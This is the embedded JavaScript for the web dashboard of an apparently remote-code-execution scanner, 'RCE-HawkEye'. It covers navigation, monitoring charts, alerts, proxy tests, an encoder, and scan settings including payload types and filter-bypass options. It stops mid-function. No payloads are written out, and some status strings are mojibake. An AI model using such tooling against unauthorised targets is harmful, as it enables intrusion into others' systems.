package web

var customJS = `
var currentScanId = null;
var refreshInterval = null;
var monitorInterval = null;
var cpuMemoryChart = null;
var goroutineChart = null;
var heapChart = null;
var scanChart = null;
var vulnChart = null;
var currentTimeRange = 'realtime';
var alertCount = 0;
var confirmCallback = null;

function safeT(key, defaultText) {
    if (typeof t === 'function') {
        var result = t(key);
        if (result && result !== key) {
            return result;
        }
    }
    return defaultText || key;
}

function showSection(sectionName, event) {
    if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
    }
    
    console.log('showSection called:', sectionName);
    
    try {
        var sections = document.querySelectorAll('.main-content section');
        console.log('Found sections:', sections.length);
        
        sections.forEach(function(s) {
            s.style.display = 'none';
            s.classList.remove('active');
        });
        
        var section = document.getElementById(sectionName + 'Section');
        console.log('Target section:', sectionName + 'Section', section);
        
        if (!section) {
            console.error('Section not found:', sectionName + 'Section');
            alert('Section not found: ' + sectionName + 'Section');
            return;
        }
        
        section.style.display = 'block';
        section.classList.add('active');
        
        var navLinks = document.querySelectorAll('.sidebar-nav a');
        navLinks.forEach(function(l) {
            l.classList.remove('active');
        });
        
        if (event && event.target) {
            var link = event.target.closest('a');
            if (link) {
                link.classList.add('active');
            }
        }
        
        var titleMap = {
            'dashboard': '仪表板',
            'scanner': '扫描器',
            'exploit': 'nav.exploit',
            'monitoring': 'nav.monitoring',
            'reports': 'nav.reports',
            'history': 'nav.history',
            'settings': 'nav.settings'
        };
        
        var pageTitle = document.querySelector('.page-title h2');
        if (pageTitle && titleMap[sectionName]) {
            pageTitle.setAttribute('data-i18n', titleMap[sectionName]);
            if (typeof updatePageTitle === 'function') {
                updatePageTitle(sectionName);
            } else {
                var titles = {
                    'dashboard': '仪表板',
                    'scanner': '扫描器',
                    'exploit': '漏洞利用',
                    'monitoring': '系统监控',
                    'reports': '报告中心',
                    'history': '历史记录',
                    'settings': '系统设置'
                };
                pageTitle.textContent = titles[sectionName] || sectionName;
            }
        }
        
        if (sectionName === 'monitoring') {
            if (typeof initMonitorCharts === 'function') initMonitorCharts();
            if (typeof loadMonitor === 'function') loadMonitor();
            if (typeof loadMonitorHistory === 'function') loadMonitorHistory();
            if (typeof startMonitorRefresh === 'function') startMonitorRefresh();
        } else {
            if (typeof stopMonitorRefresh === 'function') stopMonitorRefresh();
        }
        
        if (sectionName === 'reports' && typeof loadReports === 'function') {
            loadReports();
        } else if (sectionName === 'scanner' && typeof loadActiveScans === 'function') {
            loadActiveScans();
            if (typeof loadScanSettings === 'function') loadScanSettings();
        } else if (sectionName === 'history' && typeof loadHistory === 'function') {
            loadHistory();
        } else if (sectionName === 'dashboard') {
            if (typeof loadStats === 'function') loadStats();
            if (typeof loadSystemStatus === 'function') loadSystemStatus();
        } else if (sectionName === 'settings') {
            if (typeof loadSettings === 'function') loadSettings();
            if (typeof loadDictStats === 'function') loadDictStats();
        } else if (sectionName === 'exploit' && typeof refreshVulnList === 'function') {
            refreshVulnList();
        }
        
        console.log('showSection completed for:', sectionName);
    } catch (e) {
        console.error('showSection error:', e);
        alert('Error: ' + e.message);
    }
}

function showConfigTab(tabName, event) {
    if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
    }
    
    document.querySelectorAll('.config-tab').forEach(function(t) {
        t.classList.remove('active');
    });
    document.querySelectorAll('.config-panel').forEach(function(p) {
        p.classList.remove('active');
    });
    
    if (event && event.target) {
        var tab = event.target.closest('a');
        if (tab) {
            tab.classList.add('active');
        }
    }
    
    var panel = document.getElementById('config-' + tabName);
    if (panel) {
        panel.classList.add('active');
    }
}

function showSettingsTab(tabName, event) {
    if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
    }
    
    document.querySelectorAll('.settings-tab').forEach(function(t) {
        t.classList.remove('active');
    });
    document.querySelectorAll('.settings-panel').forEach(function(p) {
        p.classList.remove('active');
    });
    
    if (event && event.target) {
        var tab = event.target.closest('a');
        if (tab) {
            tab.classList.add('active');
        }
    }
    
    var panel = document.getElementById('settings-' + tabName);
    if (panel) {
        panel.classList.add('active');
    }
    
    if (tabName === 'notification') {
        loadNotificationConfig();
    }
    
    if (tabName === 'about') {
        loadVersionInfo();
    }
}

async function loadVersionInfo() {
    try {
        var response = await fetch('/api/version');
        var data = await response.json();
        
        if (data.success) {
            var versionInfo = document.getElementById('versionInfo');
            var buildDate = document.getElementById('buildDate');
            var platformInfo = document.getElementById('platformInfo');
            var goVersion = document.getElementById('goVersion');
            
            if (versionInfo) versionInfo.textContent = 'v' + data.version;
            if (buildDate) buildDate.textContent = data.build_date || '-';
            if (platformInfo) platformInfo.textContent = data.platform || '-';
            if (goVersion) goVersion.textContent = data.go_version || '-';
        }
    } catch (error) {
        console.error('Failed to load version info:', error);
    }
}

async function checkForUpdates() {
    var updateStatus = document.getElementById('updateStatus');
    if (updateStatus) {
        updateStatus.innerHTML = '<span class="checking">' + safeT('about.checking', 'Checking for updates...') + '</span>';
    }
    
    try {
        var response = await fetch('/api/version/check');
        var data = await response.json();
        
        if (data.success) {
            if (data.update_available) {
                updateStatus.innerHTML = '<div class="update-available">' +
                    '<span class="new-version">' + safeT('about.newVersion', 'New version available!') + ' v' + data.latest_version + '</span>' +
                    '<a href="' + data.download_url + '" target="_blank" class="btn-primary" style="margin-top: 8px;">' +
                    safeT('about.download', 'Download') + '</a>' +
                    '</div>';
            } else {
                updateStatus.innerHTML = '<span class="up-to-date">' + safeT('about.upToDate', 'You are running the latest version!') + '</span>';
            }
        }
    } catch (error) {
        console.error('Failed to check for updates:', error);
        if (updateStatus) {
            updateStatus.innerHTML = '<span class="error">' + safeT('about.checkFailed', 'Failed to check for updates') + '</span>';
        }
    }
}

function toggleUserMenu() {
    var dropdown = document.getElementById('userDropdown');
    if (dropdown) dropdown.classList.toggle('show');
}

function initGlobalEventListeners() {
    document.addEventListener('click', function(event) {
        var dropdown = document.getElementById('userDropdown');
        var avatar = document.querySelector('.user-avatar');
        if (dropdown && avatar && !dropdown.contains(event.target) && !avatar.contains(event.target)) {
            dropdown.classList.remove('show');
        }
    });
    
    document.querySelectorAll('.results-tab').forEach(function(tab) {
        tab.addEventListener('click', function() {
            document.querySelectorAll('.results-tab').forEach(function(t) {
                t.classList.remove('active');
            });
            this.classList.add('active');
        });
    });
}

function logout() {
    showConfirm(safeT('common.logoutConfirm', 'Are you sure you want to logout?'), function() {
        fetch('/api/logout', { method: 'POST' }).then(function() {
            window.location.href = '/login';
        });
    });
}

function initDashboardChart() {
    var ctx = document.getElementById('vulnChart');
    if (!ctx) return;
    if (typeof Chart === 'undefined') return;
    
    if (vulnChart) vulnChart.destroy();
    
    vulnChart = new Chart(ctx, {
        type: 'doughnut',
        data: {
            labels: ['Critical', 'High', 'Medium', 'Low'],
            datasets: [{
                data: [0, 0, 0, 0],
                backgroundColor: [
                    'rgba(239, 68, 68, 0.8)',
                    'rgba(245, 158, 11, 0.8)',
                    'rgba(6, 182, 212, 0.8)',
                    'rgba(34, 197, 94, 0.8)'
                ],
                borderColor: [
                    'rgba(239, 68, 68, 1)',
                    'rgba(245, 158, 11, 1)',
                    'rgba(6, 182, 212, 1)',
                    'rgba(34, 197, 94, 1)'
                ],
                borderWidth: 1
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    position: 'right',
                    labels: {
                        color: '#f8fafc',
                        font: { size: 11 },
                        padding: 12
                    }
                }
            },
            cutout: '60%'
        }
    });
}

var cpuChart, memoryChart, networkChart, gcChart;
var cpuGaugeChart, memoryGaugeChart, heapGaugeChart, networkGaugeChart;
var currentChartView = 'trend';

function initMonitorCharts() {
    if (typeof Chart === 'undefined') return;
    
    var chartOptions = {
        responsive: true,
        maintainAspectRatio: false,
        plugins: {
            legend: { display: false },
            tooltip: {
                backgroundColor: 'rgba(15, 23, 42, 0.95)',
                titleColor: '#f8fafc',
                bodyColor: '#f8fafc',
                borderColor: 'rgba(34, 197, 94, 0.3)',
                borderWidth: 1,
                padding: 12,
                cornerRadius: 8
            }
        },
        scales: {
            x: {
                display: true,
                grid: { color: 'rgba(248, 250, 252, 0.05)' },
                ticks: { color: 'rgba(248, 250, 252, 0.5)', font: { size: 10 }, maxTicksLimit: 8 }
            },
            y: {
                display: true,
                grid: { color: 'rgba(248, 250, 252, 0.05)' },
                ticks: { color: 'rgba(248, 250, 252, 0.5)', font: { size: 10 } },
                beginAtZero: true
            }
        },
        interaction: { intersect: false, mode: 'index' },
        animation: { duration: 300 }
    };
    
    var cpuCtx = document.getElementById('cpuChart');
    var memoryCtx = document.getElementById('memoryChart');
    var networkCtx = document.getElementById('networkChart');
    var goroutineCtx = document.getElementById('goroutineChart');
    var heapCtx = document.getElementById('heapChart');
    var gcCtx = document.getElementById('gcChart');
    
    if (cpuCtx) {
        if (cpuChart) cpuChart.destroy();
        cpuChart = new Chart(cpuCtx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'CPU %',
                    data: [],
                    borderColor: '#22c55e',
                    backgroundColor: 'rgba(34, 197, 94, 0.1)',
                    fill: true,
                    tension: 0.4,
                    pointRadius: 0,
                    pointHoverRadius: 4,
                    borderWidth: 2
                }]
            },
            options: { ...chartOptions, scales: { ...chartOptions.scales, y: { ...chartOptions.scales.y, max: 100 } } }
        });
    }
    
    if (memoryCtx) {
        if (memoryChart) memoryChart.destroy();
        memoryChart = new Chart(memoryCtx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'Memory MB',
                    data: [],
                    borderColor: '#06b6d4',
                    backgroundColor: 'rgba(6, 182, 212, 0.1)',
                    fill: true,
                    tension: 0.4,
                    pointRadius: 0,
                    pointHoverRadius: 4,
                    borderWidth: 2
                }]
            },
            options: chartOptions
        });
    }
    
    if (networkCtx) {
        if (networkChart) networkChart.destroy();
        networkChart = new Chart(networkCtx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'TX KB/s',
                    data: [],
                    borderColor: '#22c55e',
                    backgroundColor: 'rgba(34, 197, 94, 0.1)',
                    fill: true,
                    tension: 0.4,
                    pointRadius: 0,
                    borderWidth: 2
                }, {
                    label: 'RX KB/s',
                    data: [],
                    borderColor: '#06b6d4',
                    backgroundColor: 'rgba(6, 182, 212, 0.1)',
                    fill: true,
                    tension: 0.4,
                    pointRadius: 0,
                    borderWidth: 2
                }]
            },
            options: chartOptions
        });
    }
    
    if (goroutineCtx) {
        if (goroutineChart) goroutineChart.destroy();
        goroutineChart = new Chart(goroutineCtx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'Goroutines',
                    data: [],
                    borderColor: '#f59e0b',
                    backgroundColor: 'rgba(245, 158, 11, 0.1)',
                    fill: true,
                    tension: 0.4,
                    pointRadius: 0,
                    pointHoverRadius: 4,
                    borderWidth: 2
                }]
            },
            options: chartOptions
        });
    }
    
    if (heapCtx) {
        if (heapChart) heapChart.destroy();
        heapChart = new Chart(heapCtx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'Heap MB',
                    data: [],
                    borderColor: '#ef4444',
                    backgroundColor: 'rgba(239, 68, 68, 0.1)',
                    fill: true,
                    tension: 0.4,
                    pointRadius: 0,
                    pointHoverRadius: 4,
                    borderWidth: 2
                }]
            },
            options: chartOptions
        });
    }
    
    if (gcCtx) {
        if (gcChart) gcChart.destroy();
        gcChart = new Chart(gcCtx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'GC Pause ms',
                    data: [],
                    borderColor: '#06b6d4',
                    backgroundColor: 'rgba(6, 182, 212, 0.1)',
                    fill: true,
                    tension: 0.4,
                    pointRadius: 0,
                    pointHoverRadius: 4,
                    borderWidth: 2
                }]
            },
            options: chartOptions
        });
    }
    
    initGaugeCharts();
}

function initGaugeCharts() {
    if (typeof Chart === 'undefined') return;
    
    var gaugeOptions = {
        responsive: true,
        maintainAspectRatio: false,
        cutout: '75%',
        plugins: {
            legend: { display: false },
            tooltip: { enabled: false }
        },
        animation: { duration: 500 }
    };
    
    var cpuGaugeCtx = document.getElementById('cpuGauge');
    var memoryGaugeCtx = document.getElementById('memoryGauge');
    var heapGaugeCtx = document.getElementById('heapGauge');
    var networkGaugeCtx = document.getElementById('networkGauge');
    
    if (cpuGaugeCtx) {
        if (cpuGaugeChart) cpuGaugeChart.destroy();
        cpuGaugeChart = new Chart(cpuGaugeCtx, {
            type: 'doughnut',
            data: {
                datasets: [{
                    data: [0, 100],
                    backgroundColor: ['#22c55e', 'rgba(248, 250, 252, 0.1)'],
                    borderWidth: 0
                }]
            },
            options: gaugeOptions
        });
    }
    
    if (memoryGaugeCtx) {
        if (memoryGaugeChart) memoryGaugeChart.destroy();
        memoryGaugeChart = new Chart(memoryGaugeCtx, {
            type: 'doughnut',
            data: {
                datasets: [{
                    data: [0, 100],
                    backgroundColor: ['#06b6d4', 'rgba(248, 250, 252, 0.1)'],
                    borderWidth: 0
                }]
            },
            options: gaugeOptions
        });
    }
    
    if (heapGaugeCtx) {
        if (heapGaugeChart) heapGaugeChart.destroy();
        heapGaugeChart = new Chart(heapGaugeCtx, {
            type: 'doughnut',
            data: {
                datasets: [{
                    data: [0, 100],
                    backgroundColor: ['#ef4444', 'rgba(248, 250, 252, 0.1)'],
                    borderWidth: 0
                }]
            },
            options: gaugeOptions
        });
    }
    
    if (networkGaugeCtx) {
        if (networkGaugeChart) networkGaugeChart.destroy();
        networkGaugeChart = new Chart(networkGaugeCtx, {
            type: 'doughnut',
            data: {
                datasets: [{
                    data: [0, 100],
                    backgroundColor: ['#a855f7', 'rgba(248, 250, 252, 0.1)'],
                    borderWidth: 0
                }]
            },
            options: gaugeOptions
        });
    }
}

function setChartView(view, event) {
    if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
    }
    
    currentChartView = view;
    
    document.querySelectorAll('.view-toggle-btn').forEach(function(btn) {
        btn.classList.remove('active');
    });
    if (event && event.target) {
        event.target.classList.add('active');
    }
    
    var trendCharts = document.getElementById('trendCharts');
    var trendCharts2 = document.getElementById('trendCharts2');
    var trendCharts3 = document.getElementById('trendCharts3');
    var gaugeCharts = document.getElementById('gaugeCharts');
    
    if (view === 'trend') {
        if (trendCharts) trendCharts.style.display = 'grid';
        if (trendCharts2) trendCharts2.style.display = 'grid';
        if (trendCharts3) trendCharts3.style.display = 'grid';
        if (gaugeCharts) gaugeCharts.style.display = 'none';
    } else {
        if (trendCharts) trendCharts.style.display = 'none';
        if (trendCharts2) trendCharts2.style.display = 'none';
        if (trendCharts3) trendCharts3.style.display = 'none';
        if (gaugeCharts) gaugeCharts.style.display = 'grid';
        initGaugeCharts();
    }
}

function setTimeRange(range, event) {
    currentTimeRange = range;
    document.querySelectorAll('.time-range-btn').forEach(function(btn) {
        btn.classList.remove('active');
    });
    if (event && event.target) {
        event.target.classList.add('active');
    }
    loadMonitorHistory();
}

async function loadMonitorHistory() {
    try {
        var response = await fetch('/api/monitor/history?range=' + currentTimeRange);
        var data = await response.json();
        
        if (!data.success || !data.data) return;
        
        var labels = data.data.map(function(d) {
            var date = new Date(d.timestamp * 1000);
            return date.getHours() + ':' + String(date.getMinutes()).padStart(2, '0');
        });
        
        if (cpuChart) {
            cpuChart.data.labels = labels;
            cpuChart.data.datasets[0].data = data.data.map(function(d) { return d.cpu_usage || 0; });
            cpuChart.update('none');
        }
        
        if (memoryChart) {
            memoryChart.data.labels = labels;
            memoryChart.data.datasets[0].data = data.data.map(function(d) { return d.memory_mb || 0; });
            memoryChart.update('none');
        }
        
        if (networkChart) {
            networkChart.data.labels = labels;
            networkChart.data.datasets[0].data = data.data.map(function(d) { return d.network_tx || 0; });
            networkChart.data.datasets[1].data = data.data.map(function(d) { return d.network_rx || 0; });
            networkChart.update('none');
        }
        
        if (goroutineChart) {
            goroutineChart.data.labels = labels;
            goroutineChart.data.datasets[0].data = data.data.map(function(d) { return d.goroutines || 0; });
            goroutineChart.update('none');
        }
        
        if (heapChart) {
            heapChart.data.labels = labels;
            heapChart.data.datasets[0].data = data.data.map(function(d) { return d.heap_mb || 0; });
            heapChart.update('none');
        }
        
        if (gcChart) {
            gcChart.data.labels = labels;
            gcChart.data.datasets[0].data = data.data.map(function(d) { return d.gc_pause || 0; });
            gcChart.update('none');
        }
    } catch (error) {
        console.error('Failed to load monitor history:', error);
    }
}

async function loadAlerts() {
    try {
        var response = await fetch('/api/alerts');
        var data = await response.json();
        
        if (data.success) {
            alertCount = data.alerts ? data.alerts.length : 0;
            updateAlertBadge();
            renderAlerts(data.alerts || []);
        }
    } catch (error) {
        console.error('Failed to load alerts:', error);
    }
}

function updateAlertBadge() {
    var badge = document.getElementById('alertBadge');
    if (badge) {
        badge.textContent = alertCount;
        badge.style.display = alertCount > 0 ? 'flex' : 'none';
    }
}

function renderAlerts(alerts) {
    var container = document.getElementById('alertList');
    if (!container) return;
    
    if (!alerts || alerts.length === 0) {
        container.innerHTML = '<p class="text-muted">' + safeT('alerts.noAlerts', 'No alerts') + '</p>';
        return;
    }
    
    var html = '';
    alerts.forEach(function(a) {
        var levelClass = (a.level || 'medium').toLowerCase();
        html += '<div class="alert-item ' + levelClass + '" style="padding: 12px; background: rgba(0,0,0,0.2); border-radius: 8px; margin-bottom: 8px; border-left: 3px solid var(--accent-' + (levelClass === 'critical' ? 'red' : levelClass === 'high' ? 'yellow' : 'cyan') + ');">' +
            '<div style="font-size: 13px; font-weight: 600;">' + escapeHtml(a.type) + '</div>' +
            '<div style="font-size: 12px; color: var(--text-secondary); margin-top: 4px;">' + escapeHtml(a.message) + '</div>' +
            '<div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">' + formatTime(a.timestamp) + '</div>' +
            '</div>';
    });
    
    container.innerHTML = html;
}

function formatTime(timestamp) {
    var date = new Date(timestamp);
    return date.toLocaleString();
}

function openAlertModal() {
    document.getElementById('alertModal').classList.add('show');
    loadAlerts();
}

function closeAlertModal() {
    document.getElementById('alertModal').classList.remove('show');
}

async function clearAlerts() {
    showConfirm(safeT('monitoring.confirmClearAlerts', 'Clear all alerts?'), async function() {
        try {
            await fetch('/api/alerts/clear', { method: 'POST' });
            alertCount = 0;
            updateAlertBadge();
            renderAlerts([]);
        } catch (error) {
            console.error('Failed to clear alerts:', error);
        }
    });
}

async function exportAllReports() {
    try {
        var response = await fetch('/api/export?format=all');
        var blob = await response.blob();
        var url = window.URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'hawkeye_reports.zip';
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        a.remove();
    } catch (error) {
        console.error('Failed to export all reports:', error);
    }
}

function setUserAgent(value) {
    var input = document.getElementById('httpUserAgent');
    if (!input) return;
    
    var agents = {
        'default': 'RCE-HawkEye/1.1.2',
        'chrome': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'firefox': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'safari': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'curl': 'curl/8.4.0',
        'custom': input.value
    };
    
    if (value !== 'custom') {
        input.value = agents[value] || agents['default'];
    }
    input.readOnly = value !== 'custom';
}

function setSettingsUserAgent(value) {
    var input = document.getElementById('settingsHttpUserAgent');
    if (!input) return;
    
    var agents = {
        'default': 'RCE-HawkEye/1.1.1',
        'chrome': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'firefox': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'safari': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'curl': 'curl/8.4.0',
        'custom': input.value
    };
    
    if (value !== 'custom') {
        input.value = agents[value] || agents['default'];
    }
    input.readOnly = value !== 'custom';
}

async function testProxy() {
    var type = document.getElementById('proxyType') ? document.getElementById('proxyType').value : '';
    var address = document.getElementById('proxyAddress') ? document.getElementById('proxyAddress').value : '';
    var username = document.getElementById('proxyUsername') ? document.getElementById('proxyUsername').value : '';
    var password = document.getElementById('proxyPassword') ? document.getElementById('proxyPassword').value : '';
    var resultSpan = document.getElementById('proxyTestResult');
    
    if (!type || !address) {
        if (resultSpan) resultSpan.innerHTML = '<span style="color: var(--accent-yellow);">Please select proxy type and enter address</span>';
        return;
    }
    
    if (resultSpan) resultSpan.innerHTML = '<span style="color: var(--accent-cyan);">Testing...</span>';
    
    try {
        var response = await fetch('/api/proxy/test', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ type: type, address: address, username: username, password: password })
        });
        
        var data = await response.json();
        
        if (data.success) {
            if (resultSpan) resultSpan.innerHTML = '<span style="color: var(--accent-green);">鉁?' + safeT('proxy.testSuccess', 'Connection successful') + ' (' + data.latency + 'ms)</span>';
        } else {
            if (resultSpan) resultSpan.innerHTML = '<span style="color: var(--accent-red);">鉁?' + (data.error || safeT('common.error', 'Error') || 'Connection failed') + '</span>';
        }
    } catch (error) {
        if (resultSpan) resultSpan.innerHTML = '<span style="color: var(--accent-red);">鉁?' + error.message + '</span>';
    }
}

async function testSettingsProxy() {
    var type = document.getElementById('settingsProxyType') ? document.getElementById('settingsProxyType').value : '';
    var address = document.getElementById('settingsProxyAddress') ? document.getElementById('settingsProxyAddress').value : '';
    var username = document.getElementById('settingsProxyUsername') ? document.getElementById('settingsProxyUsername').value : '';
    var password = document.getElementById('settingsProxyPassword') ? document.getElementById('settingsProxyPassword').value : '';
    var resultSpan = document.getElementById('settingsProxyTestResult');
    
    if (!type || !address) {
        if (resultSpan) resultSpan.innerHTML = '<span style="color: var(--accent-yellow);">Please select proxy type and enter address</span>';
        return;
    }
    
    if (resultSpan) resultSpan.innerHTML = '<span style="color: var(--accent-cyan);">Testing...</span>';
    
    try {
        var response = await fetch('/api/proxy/test', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ type: type, address: address, username: username, password: password })
        });
        
        var data = await response.json();
        
        if (data.success) {
            if (resultSpan) resultSpan.innerHTML = '<span style="color: var(--accent-green);">鉁?' + safeT('proxy.testSuccess', 'Connection successful') + ' (' + data.latency + 'ms)</span>';
        } else {
            if (resultSpan) resultSpan.innerHTML = '<span style="color: var(--accent-red);">鉁?' + (data.error || safeT('common.error', 'Error') || 'Connection failed') + '</span>';
        }
    } catch (error) {
        if (resultSpan) resultSpan.innerHTML = '<span style="color: var(--accent-red);">鉁?' + error.message + '</span>';
    }
}

function encodeText(type) {
    var input = document.getElementById('encoderInput') ? document.getElementById('encoderInput').value : '';
    var output = document.getElementById('encoderOutput');
    
    if (!input || !output) return;
    
    try {
        var result = '';
        switch (type) {
            case 'url':
                result = encodeURIComponent(input);
                break;
            case 'base64':
                result = btoa(unescape(encodeURIComponent(input)));
                break;
            case 'hex':
                result = Array.from(new TextEncoder().encode(input)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
                break;
            case 'unicode':
                result = Array.from(input).map(function(c) { return '\\\\u' + c.charCodeAt(0).toString(16).padStart(4, '0'); }).join('');
                break;
            default:
                result = input;
        }
        output.value = result;
    } catch (error) {
        output.value = 'Error: ' + error.message;
    }
}

function decodeText(type) {
    var input = document.getElementById('encoderInput') ? document.getElementById('encoderInput').value : '';
    var output = document.getElementById('encoderOutput');
    
    if (!input || !output) return;
    
    try {
        var result = '';
        switch (type) {
            case 'url':
                result = decodeURIComponent(input);
                break;
            case 'base64':
                result = decodeURIComponent(escape(atob(input)));
                break;
            default:
                result = input;
        }
        output.value = result;
    } catch (error) {
        output.value = 'Error: ' + error.message;
    }
}

function getScanConfig() {
    var httpHeaders = document.getElementById('httpHeaders');
    var headers = [];
    if (httpHeaders && httpHeaders.value) {
        httpHeaders.value.split('\n').forEach(function(h) {
            if (h.trim()) headers.push(h.trim());
        });
    }
    
    var urlFile = document.getElementById('urlFile');
    var urls = urlFile && urlFile.value ? urlFile.value.split('\n').map(function(u) { return u.trim(); }).filter(function(u) { return u; }) : [];
    
    var techStack = [];
    document.querySelectorAll('input[name="techStack"]:checked').forEach(function(cb) {
        techStack.push(cb.value);
    });
    
    var payloadTypes = [];
    document.querySelectorAll('input[name="payloadType"]:checked').forEach(function(cb) {
        payloadTypes.push(cb.value);
    });
    
    var encodings = [];
    document.querySelectorAll('input[name="encoding"]:checked').forEach(function(cb) {
        encodings.push(cb.value);
    });
    
    var bypassTechniques = [];
    document.querySelectorAll('input[name="bypass"]:checked').forEach(function(cb) {
        bypassTechniques.push(cb.value);
    });
    
    var customPayloads = document.getElementById('customPayloads') ? document.getElementById('customPayloads').value : '';
    var customPayloadsList = customPayloads ? customPayloads.split('\n').map(function(p) { return p.trim(); }).filter(function(p) { return p; }) : [];
    
    function getVal(id, def) {
        var el = document.getElementById(id);
        return el ? el.value : def;
    }
    function getChecked(id, def) {
        var el = document.getElementById(id);
        return el ? el.checked : def;
    }
    function getInt(id, def) {
        var el = document.getElementById(id);
        return el ? parseInt(el.value) : def;
    }
    function getFloat(id, def) {
        var el = document.getElementById(id);
        return el ? parseFloat(el.value) : def;
    }
    
    return {
        url: getVal('targetUrl', null),
        urls: urls.length > 0 ? urls : null,
        raw_traffic: getVal('rawTraffic', null),
        
        method: getVal('httpMethod', 'GET'),
        data: getVal('httpPostData', ''),
        headers: headers,
        
        scan_level: getInt('scanLevel', 2),
        scan_mode: getVal('scanMode', 'echo'),
        concurrent: getInt('concurrent', 10),
        timeout: getInt('timeout', 10),
        delay_threshold: getFloat('delayThreshold', 4),
        
        crawl: getChecked('optCrawl', false),
        dir_scan: getChecked('optDirScan', true),
        param_fuzz: getChecked('optParamFuzz', true),
        smart_dict: getChecked('optSmartDict', true),
        include_response: getChecked('optIncludeResponse', false),
        verify_ssl: getChecked('optVerifySSL', false),
        prefer_https: getChecked('optPreferHTTPS', true),
        
        crawl_depth: getInt('crawlDepth', 2),
        crawl_pages: getInt('crawlPages', 100),
        
        dir_threads: getInt('dirThreads', 10),
        dir_wordlist: getVal('dirWordlist', null),
        dir_filter_status: getVal('dirFilterStatus', '200'),
        dir_filter_ext: getVal('dirFilterExt', ''),
        dir_filter_pattern: getVal('dirFilterPattern', ''),
        archive_threshold: getInt('archiveThreshold', 30),
        
        target_os: getVal('targetOS', 'both'),
        tech_stack: techStack,
        payload_types: payloadTypes,
        custom_payloads: customPayloadsList.length > 0 ? customPayloadsList : null,
        custom_wordlist: getVal('customWordlist', null),
        
        encodings: encodings,
        bypass_techniques: bypassTechniques,
        
        proxy_type: getVal('proxyType', ''),
        proxy_address: getVal('proxyAddress', ''),
        proxy_username: getVal('proxyUsername', ''),
        proxy_password: getVal('proxyPassword', ''),
        
        user_agent: getVal('httpUserAgent', 'RCE-HawkEye/1.1.1'),
        
        allow_domains: getVal('allowDomains', ''),
        block_domains: getVal('blockDomains', ''),
        restrict_root: getChecked('optRestrictRoot', true),
        
        output_format: getVal('outputFormat', 'html'),
        output_dir: getVal('outputDir', './reports')
    };
}

var defaultScanSettings = {
    scan_level: '2',
    scan_mode: 'echo',
    concurrent: 10,
    timeout: 10,
    crawl: false,
    dir_scan: true,
    param_fuzz: true,
    smart_dict: true,
    include_response: false,
    verify_ssl: false,
    http_method: 'GET',
    delay_threshold: 4,
    user_agent: 'RCE-HawkEye/1.1.1',
    crawl_depth: 2,
    crawl_pages: 100,
    dir_threads: 10,
    dir_filter_status: '200',
    output_format: 'html',
    output_dir: './reports',
    target_os: 'both',
    tech_stack: ['php', 'jsp', 'asp', 'aspx', 'python', 'nodejs', 'template'],
    payload_types: ['echo', 'time', 'code'],
    encodings: ['url'],
    bypass_techniques: []
};

function setElementValue(id, value) {
    var el = document.getElementById(id);
    if (el) {
        el.value = value;
    }
}

function setElementChecked(id, checked) {
    var el = document.getElementById(id);
    if (el) {
        el.checked = checked;
    }
}

function resetScanSettings() {
    try {
        setElementValue('targetUrl', '');
        setElementValue('urlFile', '');
        setElementValue('rawTraffic', '');
        
        setElementValue('scanLevel', defaultScanSettings.scan_level);
        setElementValue('scanMode', defaultScanSettings.scan_mode);
        setElementValue('concurrent', defaultScanSettings.concurrent);
        setElementValue('timeout', defaultScanSettings.timeout);
        
        setElementChecked('optCrawl', defaultScanSettings.crawl);
        setElementChecked('optDirScan', defaultScanSettings.dir_scan);
        setElementChecked('optParamFuzz', defaultScanSettings.param_fuzz);
        setElementChecked('optSmartDict', defaultScanSettings.smart_dict);
        setElementChecked('optIncludeResponse', defaultScanSettings.include_response);
        setElementChecked('optVerifySSL', defaultScanSettings.verify_ssl);
        
        setElementValue('httpMethod', defaultScanSettings.http_method);
        setElementValue('delayThreshold', defaultScanSettings.delay_threshold);
        setElementValue('httpPostData', '');
        setElementValue('httpHeaders', '');
        setElementValue('userAgentSelect', 'default');
        setElementValue('httpUserAgent', defaultScanSettings.user_agent);
        
        setElementValue('proxyType', '');
        setElementValue('proxyAddress', '');
        setElementValue('proxyUsername', '');
        setElementValue('proxyPassword', '');
        
        setElementValue('crawlDepth', defaultScanSettings.crawl_depth);
        setElementValue('crawlPages', defaultScanSettings.crawl_pages);
        setElementValue('dirThreads', defaultScanSettings.dir_threads);
        setElementValue('dirFilterStatus', defaultScanSettings.dir_filter_status);
        setElementValue('dirFilterExt', '');
        setElementValue('dirFilterPattern', '');
        setElementValue('dirWordlist', '');
        setElementValue('archiveThreshold', 30);
        
        setElementValue('outputFormat', defaultScanSettings.output_format);
